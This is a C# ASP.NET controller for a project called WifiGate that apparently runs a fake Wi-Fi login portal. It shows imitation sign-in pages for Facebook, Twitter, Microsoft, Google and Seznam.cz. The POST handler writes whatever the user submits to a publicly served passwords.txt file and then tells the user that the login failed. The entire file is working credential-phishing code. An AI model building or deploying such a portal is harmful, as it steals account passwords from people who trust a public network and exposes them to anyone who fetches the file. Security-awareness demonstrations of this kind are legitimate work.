using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNet.Mvc;
using Microsoft.Framework.Runtime;
using WifiGate.Models;

namespace WifiGate.Controllers {
    public class HomeController : Controller {

        readonly IApplicationEnvironment env;

        public HomeController(IApplicationEnvironment appEnvironment) {
            env = appEnvironment;
        }

        [Route("")]
        public IActionResult Index() {
            return View();
        }

        [Route("login/{service}")]
        public IActionResult Login(string service) {
            var model = new LoginModel { Service = service };
            switch (service) {
                case "facebook":
                    model.ServiceName = "Facebook";
                    break;
                case "twitter":
                    model.ServiceName = "Twitter";
                    break;
                case "microsoft":
                    model.ServiceName = "Microsoft Account";
                    break;
                case "google":
                    model.ServiceName = "Google Account";
                    break;
                case "seznam":
                    model.ServiceName = "Seznam.cz";
                    break;
                default:
                    return this.HttpNotFound();
            }
            return this.View(model);
        }

        [Route("login/{service}"), HttpPost, ValidateAntiForgeryToken]
        public IActionResult Login(string service, LoginModel model) {
            var fileName = Path.Combine(env.ApplicationBasePath, "wwwroot", "passwords.txt");
            model.AppendToLogFile(fileName);
            return this.RedirectToAction("Failed");
        }

        [Route("login/failed")]
        public IActionResult Failed() {
            return this.View();
        }

    }
}
